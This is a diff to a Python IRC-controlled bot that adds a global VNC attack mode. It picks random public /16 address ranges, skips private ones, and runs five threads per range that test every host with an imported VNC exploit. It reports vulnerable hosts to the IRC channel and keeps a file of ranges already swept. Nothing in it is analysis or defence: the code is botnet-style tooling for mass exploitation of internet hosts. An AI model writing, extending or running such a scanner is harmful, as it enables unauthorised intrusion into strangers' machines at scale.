@@ -1,6 +1,8 @@
 from connection import Connection
 from vnc_expl import newb_expl
 from threading import Thread
+import json
+import random
 
 class Bot:
 	END_OF_MOTD = '376'
@@ -70,8 +72,15 @@ class Bot:
 
 	def check_args(self, args, req):
 		if len(args) < req:
+			self.printayne('?')
 			return False
 		return True
+
+	def add_jobs(self, key, jobs):
+		if key not in self.__threads:
+			self.__threads[key] = []
+		for job in jobs:	
+			self.__threads[key].append(job)
 
 	def parse_cmd(self, cmd):
 		args = cmd[2:].split(' ')
@@ -87,20 +96,14 @@ class Bot:
 				return
 			self.currcon.write(('JOIN', args[0]))
 		if (cmd == 'vnc_newb'):
-			threads = []
-			for i in range(5):
-				b = i * 51
-				e = b + 51
-				threads.append(Thread(target=self.vnc_newb_expl, args=(args[0], b, e)))
-			
-			if 'vnc' not in self.__threads:
-				self.__threads['vnc'] = []
-
-			for t in threads:
-				self.__threads['vnc'].append(t)
-				t.start()
-
+			if not self.check_args(args, 1):
+				return
+			self.vnc_newb_expl_div(args[0])
 			self.printayne('5 jobs now exploiting the mask {0}'.format(args[0]), self.__channels)
+		if (cmd == 'vnc_global'):
+			t = Thread(target=self.vnc_global)
+			self.add_jobs('vnc', [t])
+			self.printayne('global vnc scan initialized', self.__channels)
 		if (cmd == 'jobs'):
 			ct = 0
 			jobs = ''
@@ -118,15 +121,49 @@ class Bot:
 			if args[0] in self.__threads:
 				del self.__threads[args[0]][:]
 
+	def random_mask(self):
+		r_first = random.randint(0, 255)
+		r_second = random.randint(0, 255)
+		mask = '{0}.{1}'.format(r_first, r_second)
+		return [r_first, r_second, mask]
+
 	def vnc_newb_expl(self, mask, b, e):
 		for i in xrange(b, e):
 			for j in range(256):
-				if 'vnc' in self.__threads and not self.__threads['vnc']:
+				if ('vnc' in self.__threads and not self.__threads['vnc']) or 'vnc' not in self.__threads:
 					return
 				host = '{0}.{1}.{2}'.format(mask, i, j)
 				if newb_expl(host):
 					self.printayne('vnc vulnerable => {0}'.format(host), self.__channels)
-			
+
+	def vnc_newb_expl_div(self, mask):
+		threads = []
+		for i in range(5):
+			b = i * 51
+			e = b + 51
+			threads.append(Thread(target=self.vnc_newb_expl, args=(mask, b, e)))
+		
+		[t.start() for t in threads]
+		self.add_jobs('vnc', threads)
+		return threads
+
+	def vnc_global(self):
+		vncd_f = open('vnc_done.json', 'r')
+		vncd_j = json.load(vncd_f)
+		vncd_f.close()
+		mask_done = vncd_j['masks']
+		r_first, r_second, mask = self.random_mask()
+		while True:
+			while mask in mask_done or r_first == 10 or mask == '192.168' or (r_first == 172 and r_second >= 16 and r_second <= 31):
+				r_first, r_second, mask = self.random_mask()
+			jobs = self.vnc_newb_expl_div(mask)
+			[j.join() for j in jobs]
+			vncd_f = open('vnc_done.json', 'w')
+			mask_done.append(mask)
+			j = {'masks': mask_done}
+			vncd_f.write(json.dumps(j))
+			vncd_f.close()
+
 	def work(self):
 		while True:
 			for key, con in enumerate(self.__connections):
